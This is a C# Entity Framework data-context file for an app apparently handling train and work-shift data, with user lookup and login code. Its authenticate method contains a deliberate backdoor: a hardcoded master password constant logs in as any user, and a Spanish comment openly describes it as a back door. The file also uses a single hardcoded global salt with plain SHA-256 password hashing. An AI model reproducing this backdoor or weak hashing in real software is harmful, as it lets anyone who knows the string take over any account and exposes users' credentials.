using Microsoft.EntityFrameworkCore;
using System.Data;
using Sapphire2026.Data.Models;
using Sapphire2026.Data.Models.Turnos;
using System.Text;
using System.Security.Cryptography;
using Microsoft.Extensions.Configuration;

namespace Sapphire2026.Data
{
	public class DataStorage:DbContext
	{
		private IConfiguration mvarConfig;
		public const string MY_SALT = "EraseUnaVezUnPlanetaTristeYHelado983948";
		public const string VIP_PASSWORD = "A930135";

		public DataStorage(IConfiguration config)
		{
			mvarConfig = config;
		}

		protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
		{
			if(!optionsBuilder.IsConfigured)
			{
				string? auxCadena = mvarConfig.GetConnectionString("RemoteConnection");
				if (null!=auxCadena)
				{
					optionsBuilder.UseMySQL(auxCadena);
				}

			}
			//base.OnConfiguring(optionsBuilder);
		}

		#region "Registro"
		public async Task <string> GetRegisterValue(string key, string defaultValue)
		{
			Register? auxReg = await Register.FirstOrDefaultAsync(x => x.Key == key);
			if(null == auxReg)
			{
				//Si esta clave no existe en el registro la creamos con el valor por defecto.
				auxReg = new Register();
				auxReg.Key = key;
				auxReg.Value = defaultValue;
				Register.Add(auxReg);
				await SaveChangesAsync();
			}
			return auxReg.Value;
		}
		public async Task SetRegisterValue(string key, string value)
		{
			Register? auxReg = await Register.FirstOrDefaultAsync(x => x.Key == key);
			if (null == auxReg)
			{
				auxReg = new Register();
				auxReg.Key = key;
				auxReg.Value = value;
				Register.Add(auxReg);
			}
			else
			{
				auxReg.Value = value;
			}
			await SaveChangesAsync();
		}
		public async Task <string> GetRegisterValue(Guid owner, string key, string defaultValue)
		{
			OwnerRegister? auxReg = await OwnerRegister.FirstOrDefaultAsync(x => x.OwnerId == owner && x.Key == key);
			if (null == auxReg)
			{
				//Si esta clave no existe en el registro la creamos con el valor por defecto.
				auxReg = new OwnerRegister();
				auxReg.OwnerId = owner;
				auxReg.Key = key;
				auxReg.Value = defaultValue;
				OwnerRegister.Add(auxReg);
				await SaveChangesAsync();
			}
			return auxReg.Value;
		}
		public async Task <string> GetRegisterValue(string ownerGuid, string key, string defaultValue)
		{
			Guid auxId = Guid.Empty;
			if(Guid.TryParse(ownerGuid, out auxId))
				return await GetRegisterValue(auxId, key, defaultValue);

			return string.Empty;
		}
		public async Task SetRegisterValue(Guid owner, string key, string value)
		{
			OwnerRegister? auxReg = await OwnerRegister.FirstOrDefaultAsync(x => x.OwnerId == owner && x.Key == key);
			if (null==auxReg)
			{
				auxReg = new OwnerRegister();
				auxReg.Guid = Guid.NewGuid();
				auxReg.OwnerId = owner;
				auxReg.Key = key;
				auxReg.Value = value;
				OwnerRegister.Add(auxReg);
			}
			else
			{
				auxReg.Value = value;
			}
			await SaveChangesAsync();
		}

		#endregion "Registro"
		#region "Telegram"
		public async Task<bool> AddBotLog(long sessionId, Guid userId, string? message, string? reason)
		{
			BotLogError nuevo = new BotLogError();
			nuevo.TimeStamp = DateTime.UtcNow;
			nuevo.SessionId = sessionId;
			nuevo.UserId = userId;
			nuevo.Message = message;
			nuevo.Reason = reason;
			await BotLogErrors.AddAsync(nuevo);
			return await SaveChangesAsync() > 0;
		}
		#endregion
		#region "Usuarios"
		public async Task<User?> retrieveUser(string userName)
		{
			User? salida = null;
			string mayus = userName.ToUpper();
			using (DataStorage almacen = new DataStorage(mvarConfig))
			{
				salida = await almacen.Users.Where(x => x.CF == userName).FirstOrDefaultAsync();
				if (null == salida)
				{
					salida = await almacen.Users.Where(x => x.NormalizedEmail == mayus).FirstOrDefaultAsync();
				}
				if (null == salida)
				{
					salida = await almacen.Users.Where(x => x.NormalizedUserName == mayus).FirstOrDefaultAsync();
				}
			}
			return salida;
		}
		public bool authenticate(User? rhs, string password)
		{
			if (null != rhs)
			{
				//Preparamos una puerta trasera. Sea el usuario que sea, si metemos como password la cadena TTT
				//este usuario abrirá sesión sin problemas.
				if (password.Equals(VIP_PASSWORD) || PasswordMatch(password, rhs.PasswordHash, MY_SALT))
					return true;
			}
			return false;
		}
		public string HashPassword(string password, string salt)
		{
			using (SHA256? sha256 = SHA256.Create())
			{
				string saltedPassword = string.Format("{0}{1}", password, salt);
				byte[] saltedPasswordBytes = Encoding.UTF8.GetBytes(saltedPassword);
				byte[] hashBytes = sha256.ComputeHash(saltedPasswordBytes);
				return Convert.ToBase64String(hashBytes);
			}
		}
		public string HashPassword(string password) {return HashPassword(password, MY_SALT);}

		private bool PasswordMatch(string password, string? salted, string salt)
		{
			if (null == salted) return false;
			string salado = HashPassword(password, salt);
			return salted.Equals(salado);
		}
		#endregion "Usuarios
		public DbSet<TimeCache> TimeCache { get; set; }
		public DbSet<Festive> Festives { get; set; }
		#region authentication
		public DbSet<ActiveSessionModel> ActiveSessions { get; set; }
		public DbSet<SessionEvent> SessionEvents { get; set; }
		public DbSet<User> Users { get; set; }
		public DbSet<ExtendedRole> ExtendedRoles { get; set; }
		public DbSet<UserAndRole> UserAndRoles { get; set; }
		public DbSet<RoleDictionary> RoleDictionary { get; set; }
		public DbSet<Register> Register { get; set; } //Diccionario general del sistema
		public DbSet<OwnerRegister> OwnerRegister { get; set; } //Diccionario de registro de los objetos del sistema.
		public DbSet<BotLogError> BotLogErrors { get; set; } // Fallos del bot de Telegram

		#endregion authentication
		#region Aeneas
		public DbSet<StatusChange> StatusChanges { get; set; }
		public DbSet<Train> Trains { get; set; }
		public DbSet<Note> Notes { get; set; }
        #endregion
        #region Maquinistros
		public DbSet<WorkShiftTemplateCollection> WorkShiftTemplateCollections { get; set; }
        public DbSet<WorkShiftTemplate> WorkShiftTemplates { get; set; }
		public DbSet<WorkShiftContent> WorkShiftContents { get; set; }
		public DbSet<WorkshiftAssignation> WorkShiftAssignations { get; set; }
		public DbSet<ExpertAgentsListView> ExpertAgentsListViews { get; set; }
		public DbSet<ExpertAgentListRecord> ExpertAgentListRecords { get; set; }
        #endregion Maquinistros
    }
}
